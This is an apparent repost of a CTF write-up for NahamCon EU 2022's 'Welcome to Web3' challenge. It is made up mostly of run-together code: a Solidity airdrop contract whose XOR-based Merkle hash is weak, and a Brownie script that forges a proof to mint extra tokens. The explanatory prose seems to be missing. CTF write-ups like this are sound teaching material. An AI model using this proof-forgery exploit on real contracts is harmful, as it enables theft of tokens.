# NahamCon EU CTF 2022 – Welcome to Web3!

> 原文: https://www.ctfiot.com/85511.html
> ID: 85511


```
def solved():
 token = SimpleToken[-1]

 # You should mint 100000 amount of token.
 if token.totalSupply() == 200000:
 return True, "Solved!"
 else:
 return False, "Not solved, you need to mint enough to solve."
def deploy():
 ADMIN = accounts[9]
 token = SimpleToken.deploy('Simple Token', 'STK', {'from': ADMIN})
 _merkleRoot = 0x654ef3fa251b95a8730ce8e43f44d6a32c8f045371ce6a18792ca64f1e148f8c
 airdrop = Airdrop.deploy(token, 1e5, _merkleRoot, 4, {'from': ADMIN})
 token.setAirdropAddress(airdrop, {'from': ADMIN})

 merkleProof = [
 int(convert.to_bytes(ADMIN.address).hex(),16),
 0x000000000000000000000000feb7377168914e8771f320d573a94f80ef953782,
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]

 airdrop.mintToken(merkleProof)
function mint(address addr, uint256 amount) external{
 require(msg.sender == airdropAddress, "You can't call this");
 _mint(addr, amount);
 }
function mintToken(bytes32[] memory merkleProof) external {
 require(!dropped[msg.sender], "Already dropped");
 require(merkleProof.length == proofLength, "Tree length mismatch");
 require(address(uint160(uint256(merkleProof[0]))) == msg.sender, "First Merkle leaf should be the msg.sender's address");
 require(proofHash(merkleProof) == merkleRoot, "Merkle proof failed");

 dropped[msg.sender] = true;
 token.mint(msg.sender, dropPerAddress);
 _latestAcceptedProof = merkleProof;
 }
merkleProof = [
 int(convert.to_bytes(ADMIN.address).hex(),16),
 0x000000000000000000000000feb7377168914e8771f320d573a94f80ef953782,
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]
from brownie import Airdrop, accounts, Wei, convert

def test_solve():
	# Set the deployed contract address
 contract = Airdrop.at("0xA15BB66138824a1c7167f5E85b957d04Dd34E468")
 # Get the first local account to be out account for testing
 account = accounts[0]

	# Print some variables to stdout
 print(f"[+] Contract: {contract}")
 print(f"[+] Account: {account}")
 print(f"[+] Admin Account: {accounts[9]}")

	# Calculate the first argument of our array
 merkleProof = [
 convert.to_bytes(account.address).hex()
 ]

	#Print it
 print(merkleProof)
function proofHash(bytes32[] memory nodes) internal pure returns (bytes32 result) {
 result = pairHash(nodes[0], nodes[1]);
 for (uint256 i = 2; i < nodes.length; i++) {
 result = pairHash(result, nodes[i]);
 }
 }
function pairHash(bytes32 a, bytes32 b) internal pure returns (bytes32) {
 return keccak256(abi.encode(a ^ b));
 }
merkleProof = [
 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266, # Our testing account
 0x000000000000000000000000adc69b805f1aba6eb34c04277eae5760308b82c4, # New element calculated
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]
from brownie import Airdrop, accounts, Wei, convert

def test_solve():
 contract = Airdrop.at("0xA15BB66138824a1c7167f5E85b957d04Dd34E468")
 account = accounts[0]

 print(f"[+] Contract: {contract}")
 print(f"[+] Account: {account}")
 print(f"[+] Admin Account: {accounts[9]}")

 merkleProof = [
 0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266,
 0x000000000000000000000000adc69b805f1aba6eb34c04277eae5760308b82c4,
 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6,
 0x290decd9548b62a8d60345a988386fc84ba6bc95484008f6362f93160ef3e563
 ]

 contract.mintToken(merkleProof, {"from": account})

 print(f"\n[+] Last accepted proof: {contract.latestAcceptedProof()}")
```
